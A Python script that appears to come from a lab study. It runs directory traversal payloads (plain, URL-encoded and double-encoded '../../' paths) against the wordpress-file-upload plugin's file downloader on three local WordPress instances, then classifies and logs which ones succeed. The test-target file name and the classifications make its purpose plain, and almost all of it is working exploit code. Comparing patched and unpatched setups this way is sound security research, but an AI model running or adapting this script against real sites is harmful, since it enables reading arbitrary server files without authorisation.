import requests
import urllib.parse
import time
import csv

# Define your target base URLs
targets = {
    "wp_vuln_7.4": "http://localhost:8081",
    "wp_patch_7.4": "http://localhost:8082",
    "wp_hardened_8.1": "http://localhost:8083"
}

# Define payloads to test
payloads = {
    "simple": "../../test-target.txt",
    "url_encoded": urllib.parse.quote("../../test-target.txt"),
    "double_encoded": urllib.parse.quote(urllib.parse.quote("../../test-target.txt"))
}

# Prepare CSV log file
logfile = r"results\dynamic_results.csv"
with open(logfile, mode='w', newline='', encoding='utf-8') as f:
    writer = csv.writer(f)
    writer.writerow(["Site", "Payload Type", "Payload", "HTTP Status", "Plugin Response", "Classification"])

    def run_attack(site_name, base_url, payload_type, payload):
        url = f"{base_url}/wp-content/plugins/wordpress-file-upload/wfu_file_downloader.php?file={payload}"
        print(f"\n🚀 Attacking {site_name} with {payload_type} payload: {payload}")
        try:
            r = requests.get(url)
            status = r.status_code
            body = r.text.strip()[:100]

            # Classification
            if "DUMMY_CONTENT" in body:
                classification = "✅ Exploit Success"
            elif "File not found" in body:
                classification = "⚠️ Partial (Traversal allowed)"
            elif "Invalid" in body or "Blocked" in body:
                classification = "⛔ Blocked"
            elif status == 403:
                classification = "⛔ Blocked"
            elif status == 404:
                classification = "❌ Not Found"
            else:
                classification = "❓ Unclear"

            print(f"🔍 Response: {body}")
            print(f"📊 Classification: {classification}")

            writer.writerow([site_name, payload_type, payload, status, body, classification])

        except Exception as e:
            print(f"❌ Error: {e}")
            writer.writerow([site_name, payload_type, payload, "Error", str(e), "❌ Error"])

    # Run all tests
    for site, url in targets.items():
        for payload_type, payload in payloads.items():
            run_attack(site, url, payload_type, payload)
            time.sleep(1)

print(f"\n✅ Results saved to {logfile}")
